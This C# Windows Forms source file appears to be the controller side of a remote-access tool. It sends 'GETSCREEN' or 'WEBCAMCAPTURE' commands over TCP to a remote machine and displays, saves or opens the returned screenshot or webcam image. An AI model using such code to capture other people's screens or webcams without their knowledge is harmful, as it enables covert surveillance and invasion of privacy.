using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.IO;
using Tcpclient.Components;

namespace Tcpclient {
    public partial class GetScreen : Form {
        TcpClient client;
        int compression;
        string command;

        public GetScreen(TcpClient client, string cmd, int compr) {
            this.client = client;
            compression = compr;
            command = cmd;
            InitializeComponent();
            if (!command.Equals("GETSCREEN")) {
                Text = "Remote WebCamera";
                Icon = Properties.Resources.cam_small_ico;
            }
            backgroundWorker1.RunWorkerAsync();
            Send(command, compression);
        }

        bool receiving = false;

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e) {
            try {
                TResponse response = new TResponse(client.GetStream());
                while (response.Receive() != 0) {
                    receiving = false;

                    if ((response.RespondedTo.StartsWith("GETSCREEN") || response.RespondedTo.StartsWith("WEBCAMCAPTURE"))
                        && response.Status == 200) {
                        Invoke(new MethodInvoker(delegate {
                            picture(response.ByteBase64);
                        }));
                        continue;
                    }
                    if (response.Status == 404) {
                        BeginInvoke(new MethodInvoker(delegate { setProgress(false); }));
                        MessageBox.Show("Unable to retrieve image\r\nThe server may not have a suitable webcam.", Text, MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }
            }
            catch (Exception ex) {
                if (ex.Message.Contains("blocking operation"))
                    return;
                MessageBox.Show(ex.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void picture(byte[] img) {
            using (Stream s = new MemoryStream(img)) {
                pictureBox1.Image = Bitmap.FromStream(s);
                setProgress(false);
            }
        }

        private void setProgress(bool loading) {
            progressBar1.Visible = loading;
        }

        private void button1_Click(object sender, EventArgs e) {
            Send(command, compression);
        }

        public void Send(params object[] args) {
            if (!receiving) {
                setProgress(true);
                TMessage tMsg = new TMessage(client.GetStream());
                receiving = true;
                tMsg.Send(args);
            }
            else {
                MessageBox.Show(this, "We are currently awaiting a response from the server. Please wait a few moments and execute the command again.",
                    this.Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void button2_Click(object sender, EventArgs e) {
            this.Close();
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e) {
            if (this.pictureBox1.Image == null) {
                MessageBox.Show(this, "There is no image to save.", this.Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }
            if (saveFileDialog1.ShowDialog() == System.Windows.Forms.DialogResult.OK) {
                try {
                    pictureBox1.Image.Save(saveFileDialog1.FileName);
                    MessageBox.Show(this, "The image has been saved to the drive.", this.Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex) {
                    MessageBox.Show(this, "Unable to save picture:\r\n" + ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void OpenPictureViewer() {
            if (pictureBox1.Image == null) {
                return;
            }
            try {
                string curdir = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Remove(0, 6);
                string nomen = curdir + @"\Temp\" + DateTime.Now.ToString("mmm-dd-yyyy hh-mm-ss") + ".jpg";
                pictureBox1.Image.Save(nomen);
                System.Diagnostics.Process.Start(nomen);
            }
            catch {
                MessageBox.Show(this, "The picture was unable to be opened in default picture viewer.", this.Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e) {
            OpenPictureViewer();
        }

        private void GetScreen_Load(object sender, EventArgs e) {

        }
    }
}